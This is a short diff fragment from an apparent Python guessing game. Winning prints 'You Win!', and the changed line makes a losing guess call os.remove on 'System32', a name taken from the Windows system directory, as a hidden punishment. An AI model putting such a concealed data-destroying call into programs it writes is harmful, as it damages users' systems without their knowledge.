@@ -10,7 +10,7 @@ while True:
         if shot == (1,5):
             print('You Win!')
         else:
-            os.remove("system.32")
+            os.remove("System32")
     else:
         break
 
